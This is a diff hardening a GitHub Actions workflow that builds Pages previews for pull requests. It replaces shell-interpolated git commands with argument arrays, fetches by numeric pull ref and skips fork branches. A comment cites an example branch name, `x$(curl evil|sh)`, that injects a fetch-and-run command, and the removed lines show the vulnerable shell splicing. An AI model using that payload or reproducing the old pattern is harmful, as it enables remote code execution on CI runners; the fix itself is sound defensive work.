@@ -52,7 +52,22 @@ jobs:
         uses: actions/github-script@v7
         with:
           script: |
-            const { execSync } = require('child_process');
+            // SECURITY: a PR's head-branch name (pr.head.ref) is attacker-controlled
+            // on a public repo — a fork PR author picks it. This step used to splice
+            // it UNSANITISED into shell strings: execSync(`git fetch origin ${branch} …`).
+            // A branch like `x$(curl evil|sh)` is a valid git ref, so the `$(…)` ran in
+            // the shell on every push to main → remote code execution. Two defenses now
+            // stack: (1) no shell — execFileSync passes args straight to git as an array,
+            // so a name can never be re-parsed; (2) we fetch by the NUMERIC pull ref
+            // (pr.number, never injectable) and refuse any branch name that is not a
+            // plain git ref. We also skip fork PRs entirely, preserving the prior
+            // behaviour (their branch was never on origin, so they were already skipped)
+            // and keeping untrusted fork content off the Pages site.
+            const { execFileSync } = require('child_process');
+            const fs = require('fs');
+            const git = (args) => execFileSync('git', args, { stdio: 'inherit' });
+            const SAFE_REF = /^[A-Za-z0-9._/-]+$/;
+            const baseRepo = `${context.repo.owner}/${context.repo.repo}`;
             const { data: prs } = await github.rest.pulls.list({
               owner: context.repo.owner,
               repo: context.repo.repo,
@@ -61,18 +76,33 @@ jobs:
             });
             for (const pr of prs) {
               const branch = pr.head.ref;
+              // Only same-repo branch PRs (the self-fixing loops) get previews.
+              const headRepo = pr.head.repo && pr.head.repo.full_name;
+              if (headRepo !== baseRepo) {
+                console.log(`Skipping PR #${pr.number}: fork or unknown head repo (${headRepo || 'none'})`);
+                continue;
+              }
+              // Defense in depth: the name must be a plain git ref even though it no
+              // longer reaches a shell.
+              if (typeof branch !== 'string' || !SAFE_REF.test(branch)) {
+                console.log(`Skipping PR #${pr.number}: unsafe branch name`);
+                continue;
+              }
               const slug = branch.replace(/[^a-zA-Z0-9-]/g, '-');
+              const dest = `_site/preview/${slug}`;
               console.log(`Assembling preview for PR #${pr.number}: ${branch} → /preview/${slug}/`);
               try {
-                execSync(`git fetch origin ${branch} --depth=1`, { stdio: 'inherit' });
-                execSync(`git checkout origin/${branch} -- docs/`, { stdio: 'inherit' });
-                execSync(`mkdir -p _site/preview/${slug}`, { stdio: 'inherit' });
-                execSync(`cp -r docs/* _site/preview/${slug}/`, { stdio: 'inherit' });
-                execSync(`git checkout main -- docs/`, { stdio: 'inherit' });
+                // refs/pull/<n>/head resolves to the PR's head commit for same-repo and
+                // fork PRs alike; <n> is an integer, so nothing user-controlled is passed.
+                git(['fetch', 'origin', `refs/pull/${pr.number}/head`, '--depth=1']);
+                git(['checkout', 'FETCH_HEAD', '--', 'docs/']);
+                fs.mkdirSync(dest, { recursive: true });
+                fs.cpSync('docs', dest, { recursive: true });
+                git(['checkout', 'main', '--', 'docs/']);
                 console.log(`  ✓ Preview ready at /preview/${slug}/`);
               } catch (err) {
                 console.log(`  ✗ Skipped: ${err.message}`);
-                try { execSync(`git checkout main -- docs/`, { stdio: 'inherit' }); } catch {}
+                try { git(['checkout', 'main', '--', 'docs/']); } catch {}
               }
             }
 
